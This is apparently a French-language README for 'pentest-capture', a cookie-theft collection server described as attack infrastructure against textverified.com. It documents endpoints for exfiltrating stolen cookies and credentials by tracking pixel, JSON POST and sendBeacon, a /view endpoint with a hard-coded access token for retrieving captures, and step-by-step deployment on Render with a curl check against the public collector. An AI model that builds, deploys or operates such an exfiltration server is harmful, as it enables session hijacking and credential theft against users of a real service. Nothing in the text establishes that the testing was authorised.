# pentest-capture

Serveur de capture de cookies pour l'infrastructure d'attaque textverified.com.

Déployable sur Render.com via le blueprint `render.yaml`.

## Endpoints

| Méthode | Chemin | Usage |
|---|---|---|
| GET | `/steal?c=<cookie>&d=<domain>` | Exfiltration par pixel (retourne un GIF 1x1) |
| POST | `/collect` | Exfiltration JSON (cookies, identifiants) |
| POST | `/beacon` | Envoi via navigator.sendBeacon |
| GET | `/view?token=...` | Lire toutes les captures |

## Déploiement sur Render

1. Pousser ce dossier sur GitHub
2. Sur render.com : **New + → Blueprint** → connecter le repo
3. Render lit `render.yaml` et déploie le service
4. URL publique : `https://pentest-capture.onrender.com`
5. Vérifier : `curl https://pentest-capture.onrender.com/view?token=tv-capture-collector`

## Captures

Les données sont conservées en mémoire + fichier `captures.log`.
Attention : le disque Render est éphémère (perdu au redeploiement) — récupérer via `/view`.